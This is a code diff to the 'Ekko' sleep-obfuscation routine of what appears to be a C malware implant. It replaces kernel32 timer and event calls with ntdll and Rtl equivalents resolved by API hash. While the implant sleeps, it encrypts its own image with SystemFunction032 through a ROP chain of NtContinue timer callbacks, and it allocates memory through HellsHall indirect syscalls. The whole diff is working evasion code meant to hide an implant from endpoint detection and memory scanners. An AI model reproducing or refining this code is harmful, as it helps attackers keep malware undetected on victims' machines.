@@ -21,21 +21,17 @@ SEC( text, C ) VOID Ekko ( DWORD SleepTime)
     Instance.Modules.Msvcrt     = Instance.Win32.LoadLibraryA( "msvcrt.dll" );
     Instance.Modules.Cryptsp     = Instance.Win32.LoadLibraryA( "cryptsp.dll" );
 
-    Instance.Win32.VirtualProtect = LdrFunction (Instance.Modules.Kernel32, 0xe857500d);
-    Instance.Win32.GetModuleHandleA = LdrFunction (Instance.Modules.Kernel32, 0xd908e1d8);
     Instance.Win32.RtlCaptureContext = LdrFunction (Instance.Modules.Kernel32, 0xeba8d910);
-    Instance.Win32.WaitForSingleObject = LdrFunction (Instance.Modules.Kernel32, 0xdf1b3da);
-    Instance.Win32.CreateTimerQueueTimer = LdrFunction (Instance.Modules.Kernel32, 0xace88880);
-    Instance.Win32.SetEvent = LdrFunction (Instance.Modules.Kernel32, 0x9d7ff713);
-    Instance.Win32.DeleteTimerQueue = LdrFunction (Instance.Modules.Kernel32, 0x1b141ede);
-    Instance.Win32.CreateEventW = LdrFunction (Instance.Modules.Kernel32, 0x76b3a892);
-    Instance.Win32.CreateTimerQueue = LdrFunction (Instance.Modules.Kernel32, 0x7d41d25f);
 
     Instance.Win32.printf = LdrFunction (Instance.Modules.Msvcrt, 0xc870eef8);
-    Instance.Win32.memcpy = LdrFunction (Instance.Modules.Msvcrt, 0xc08838d0);
 
     Instance.Win32.NtContinue = LdrFunction (Instance.Modules.Ntdll, 0xfc3a6c2c);
     Instance.Win32.NtWaitForSingleObject  = LdrFunction (Instance.Modules.Ntdll, 0xe8ac0c3c);
+    Instance.Win32.NtSetEvent = LdrFunction (Instance.Modules.Ntdll, 0xcb87d8b5);
+    Instance.Win32.NtCreateEvent = LdrFunction (Instance.Modules.Ntdll, 0x28d3233d);
+    Instance.Win32.RtlCreateTimerQueue = LdrFunction (Instance.Modules.Ntdll, 0x50ef3c31);
+    Instance.Win32.RtlCreateTimer = LdrFunction (Instance.Modules.Ntdll, 0x1877faec);
+    Instance.Win32.RtlDeleteTimerQueueEx = LdrFunction (Instance.Modules.Ntdll, 0xa5467ded);
 
     Instance.Win32.SystemFunction032 = LdrFunction (Instance.Modules.Cryptsp, 0xe58c8805);
 
@@ -63,8 +59,8 @@ SEC( text, C ) VOID Ekko ( DWORD SleepTime)
     PVOID   NtContinue  = NULL;
     PVOID   SysFunc032  = NULL;
      
-    hEvent      = Instance.Win32.CreateEventW( 0, 0, 0, 0 );
-    hTimerQueue = Instance.Win32.CreateTimerQueue();
+    Instance.Win32.NtCreateEvent( &hEvent, EVENT_ALL_ACCESS, NULL, 0, 0 ); //For 4th arg, NotificationEvent = 0
+    Instance.Win32.RtlCreateTimerQueue( &hTimerQueue) ; // https://doxygen.reactos.org/d8/dd5/ndk_2rtlfuncs_8h.html#a3c33cfe4a773cc54ead6d284427bc12c
 
 #if defined  ISEXE || defined  ISDLL
     ImageBase   = KaynCaller();
@@ -86,16 +82,19 @@ SEC( text, C ) VOID Ekko ( DWORD SleepTime)
     Img.Length  = Img.MaximumLength = ImageSize;
     
     
-    if (  Instance.Win32.CreateTimerQueueTimer( &hNewTimer, hTimerQueue, Instance.Win32.RtlCaptureContext, &CtxThread, 0, 0, WT_EXECUTEINTIMERTHREAD ) )
+    // https://doxygen.reactos.org/df/d53/dll_2win32_2kernel32_2client_2timerqueue_8c.html#a1a76d5f2b6b93fd0dbfe0571cd03effd
+    if ( Instance.Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance.Win32.RtlCaptureContext, &CtxThread, 0, 0, WT_EXECUTEINTIMERTHREAD ) == 0)
     { 
-        Instance.Win32.WaitForSingleObject( hEvent, 0x100 );
+        LARGE_INTEGER li = { 0 };
+        li.QuadPart    = (long)-1000000L * ( (long)5 ); //-10000000L = 1 second, so this should be 50 miliseconds
+        Instance.Win32.NtWaitForSingleObject( hEvent, 0, &li );
 
-        Instance.Win32.memcpy( &RopProtRW, &CtxThread, sizeof( CONTEXT ) );
-        Instance.Win32.memcpy( &RopMemEnc, &CtxThread, sizeof( CONTEXT ) );
-        Instance.Win32.memcpy( &RopDelay,  &CtxThread, sizeof( CONTEXT ) );
-        Instance.Win32.memcpy( &RopMemDec, &CtxThread, sizeof( CONTEXT ) );
-        Instance.Win32.memcpy( &RopProtRX, &CtxThread, sizeof( CONTEXT ) );
-        Instance.Win32.memcpy( &RopSetEvt, &CtxThread, sizeof( CONTEXT ) );
+        CopyMemoryEx( &RopProtRW, &CtxThread, sizeof( CONTEXT ) );
+        CopyMemoryEx( &RopMemEnc, &CtxThread, sizeof( CONTEXT ) );
+        CopyMemoryEx( &RopDelay,  &CtxThread, sizeof( CONTEXT ) );
+        CopyMemoryEx( &RopMemDec, &CtxThread, sizeof( CONTEXT ) );
+        CopyMemoryEx( &RopProtRX, &CtxThread, sizeof( CONTEXT ) );
+        CopyMemoryEx( &RopSetEvt, &CtxThread, sizeof( CONTEXT ) );
     
         /* Using HellsHall to allocate memory for the stub to be copied*/
         MyStruct    S           = { 0 };
@@ -114,7 +113,7 @@ SEC( text, C ) VOID Ekko ( DWORD SleepTime)
         HellHall(NtCurrentProcess(), &CopiedProtStub, 0, &StubSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
         StubSize = (int)GetRIPE - (int)ProtStub;                       // Alloc likes to fuck with this so let's set it back to its true value
-        Instance.Win32.memcpy( CopiedProtStub, &ProtStub, StubSize);
+        CopyMemoryEx( CopiedProtStub, &ProtStub, StubSize);
         
         PVOID temp = NULL;
 
@@ -150,7 +149,6 @@ SEC( text, C ) VOID Ekko ( DWORD SleepTime)
 
         // NtWaitForSingleObject( hTargetHdl, BOOL alert?, PLARGE_INTEGER SleepTime );
         
-        LARGE_INTEGER li = { 0 };
         li.QuadPart    = (long)-10000000L * ((long)SleepTime / 1000 ); // -10000000L = 1 second, and our sleeptime is in milliseconds
         RopDelay.Rsp   -= 8;
         RopDelay.Rip    = Instance.Win32.NtWaitForSingleObject;
@@ -176,22 +174,22 @@ SEC( text, C ) VOID Ekko ( DWORD SleepTime)
 
         // SetEvent( hEvent );
         RopSetEvt.Rsp  -= 8;
-        RopSetEvt.Rip   = Instance.Win32.SetEvent;
+        RopSetEvt.Rip   = Instance.Win32.NtSetEvent;
         RopSetEvt.Rcx   = hEvent;
-
+        RopSetEvt.Rdx   = NULL;
         
         Instance.Win32.printf( "[INFO] Queue timers\n" );
         
-        Instance.Win32.CreateTimerQueueTimer( &hNewTimer, hTimerQueue, Instance.Win32.NtContinue, &RopProtRW, 100, 0, WT_EXECUTEINTIMERTHREAD );
-        Instance.Win32.CreateTimerQueueTimer( &hNewTimer, hTimerQueue, Instance.Win32.NtContinue, &RopMemEnc, 200, 0, WT_EXECUTEINTIMERTHREAD );
-        Instance.Win32.CreateTimerQueueTimer( &hNewTimer, hTimerQueue, Instance.Win32.NtContinue, &RopDelay,  300, 0, WT_EXECUTEINTIMERTHREAD );
-        Instance.Win32.CreateTimerQueueTimer( &hNewTimer, hTimerQueue, Instance.Win32.NtContinue, &RopMemDec, 400, 0, WT_EXECUTEINTIMERTHREAD );
-        Instance.Win32.CreateTimerQueueTimer( &hNewTimer, hTimerQueue, Instance.Win32.NtContinue, &RopProtRX, 500, 0, WT_EXECUTEINTIMERTHREAD );
-        Instance.Win32.CreateTimerQueueTimer( &hNewTimer, hTimerQueue, Instance.Win32.NtContinue, &RopSetEvt, 600, 0, WT_EXECUTEINTIMERTHREAD );
+        Instance.Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance.Win32.NtContinue, &RopProtRW, 100, 0, WT_EXECUTEINTIMERTHREAD );
+        Instance.Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance.Win32.NtContinue, &RopMemEnc, 200, 0, WT_EXECUTEINTIMERTHREAD );
+        Instance.Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance.Win32.NtContinue, &RopDelay,  300, 0, WT_EXECUTEINTIMERTHREAD );
+        Instance.Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance.Win32.NtContinue, &RopMemDec, 400, 0, WT_EXECUTEINTIMERTHREAD );
+        Instance.Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance.Win32.NtContinue, &RopProtRX, 500, 0, WT_EXECUTEINTIMERTHREAD );
+        Instance.Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance.Win32.NtContinue, &RopSetEvt, 600, 0, WT_EXECUTEINTIMERTHREAD );
 
         Instance.Win32.printf( "[INFO] Wait for hEvent\n" );
 
-        Instance.Win32.WaitForSingleObject( hEvent, INFINITE );
+        Instance.Win32.NtWaitForSingleObject( hEvent, 0, NULL );
 
         Instance.Win32.printf( "[INFO] Finished waiting for event\n" );
 
@@ -201,6 +199,6 @@ SEC( text, C ) VOID Ekko ( DWORD SleepTime)
         Instance.Win32.printf("Free Status is 0x%llx\n", status);
     }
 
-    Instance.Win32.DeleteTimerQueue( hTimerQueue );
+    Instance.Win32.RtlDeleteTimerQueueEx( hTimerQueue, 0 );
 
 }
